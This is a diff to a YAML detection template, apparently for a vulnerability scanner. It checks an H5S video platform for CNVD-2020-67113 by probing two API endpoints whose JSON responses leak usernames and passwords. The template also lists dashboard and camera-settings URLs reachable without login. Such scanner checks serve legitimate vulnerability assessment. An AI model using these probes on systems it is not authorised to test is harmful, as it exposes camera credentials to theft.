@@ -1,4 +1,4 @@
-name: poc-yaml-h5s-video-platform-unauth
+name: poc-yaml-h5s-video-unauth
 manual: true
 transport: http
 rules:
@@ -7,28 +7,16 @@ rules:
       cache: true
       method: GET
       path: /api/v1/GetSrc
-    expression: response.status == 200 && response.body.bcontains(b"strUser") && response.content_type.contains("json")
+    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_AUTO") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
   h5s2:
     request:
       cache: true
       method: GET
-      path: /api/v1/GetRegion?session=null
-    expression: response.status == 200 && response.body.bcontains(b"strName") && response.content_type.contains("json")
-  h5s3:
-    request:
-      cache: true
-      method: GET
-      path: /api/v1/GetSystemInfo
-    expression: response.status == 200 && response.body.bcontains(b"strVersion") && response.content_type.contains("json")
-  h5s4:
-    request:
-      cache: true
-      method: GET
       path: /api/v1/GetDevice
-    expression: response.status == 200 && response.body.bcontains(b"strUser") && response.content_type.contains("json")
-expression: h5s1() || h5s2() || h5s3() || h5s4()
+    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_DEV") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
+expression: h5s1() || h5s2()
 detail:
   author: iak3ec(https://github.com/nu0l)
-  payload: /#/Dashboard || /#/Settings/Camera
+  payload: /#/Dashboard | /#/Settings/Camera
   links:
     - https://www.cnvd.org.cn/flaw/show/CNVD-2020-67113
